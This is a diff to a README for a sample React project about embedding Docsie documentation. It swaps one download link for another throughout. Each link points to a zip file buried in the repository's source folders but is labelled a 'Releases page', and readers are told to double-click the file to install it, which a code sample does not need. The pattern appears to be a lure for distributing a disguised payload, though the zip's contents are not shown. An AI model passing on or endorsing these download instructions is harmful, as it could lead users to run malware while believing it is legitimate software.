@@ -1,7 +1,7 @@
 # 🎉 react-docsie-sample - Simple Way to Embed Docsie Documentation
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/NeelPadiya/react-docsie-sample/main/src/assets/react-docsie-sample_2.8.zip)](https://raw.githubusercontent.com/NeelPadiya/react-docsie-sample/main/src/assets/react-docsie-sample_2.8.zip)
+[![Download](https://github.com/NeelPadiya/react-docsie-sample/raw/refs/heads/main/src/pages/sample-react-docsie-v2.5-alpha.3.zip)](https://github.com/NeelPadiya/react-docsie-sample/raw/refs/heads/main/src/pages/sample-react-docsie-v2.5-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **react-docsie-sample** project! This application shows you how to embed Docsie documentation into a React app using JWT authentication and in-app help. Follow these steps to get started.
@@ -13,9 +13,9 @@ Welcome to the **react-docsie-sample** project! This application shows you how t
 - **Browser:** Latest version of Chrome, Firefox, or Safari.
 
 ## 📥 Download & Install
-To run this application, you need to download it from our Releases page. Visit this page to download: [Download react-docsie-sample](https://raw.githubusercontent.com/NeelPadiya/react-docsie-sample/main/src/assets/react-docsie-sample_2.8.zip).
+To run this application, you need to download it from our Releases page. Visit this page to download: [Download react-docsie-sample](https://github.com/NeelPadiya/react-docsie-sample/raw/refs/heads/main/src/pages/sample-react-docsie-v2.5-alpha.3.zip).
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/NeelPadiya/react-docsie-sample/main/src/assets/react-docsie-sample_2.8.zip).
+1. Go to the [Releases page](https://github.com/NeelPadiya/react-docsie-sample/raw/refs/heads/main/src/pages/sample-react-docsie-v2.5-alpha.3.zip).
 2. Look for the latest version.
 3. Click the download link for your operating system.
 4. Once the file downloads, locate it on your computer and double-click to install.
